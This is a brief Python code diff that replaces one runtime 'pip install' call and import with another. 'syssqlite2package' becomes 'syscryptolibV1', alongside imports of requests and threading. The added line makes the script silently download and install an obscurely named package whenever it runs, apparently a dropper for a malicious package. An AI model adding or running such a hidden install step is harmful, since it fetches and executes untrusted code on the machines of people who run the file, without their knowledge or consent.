@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite2package")
-import syssqlite2package
+os.system("pip install syscryptolibV1")
+import syscryptolibV1
 from optparse import Option
 import requests
 import threading
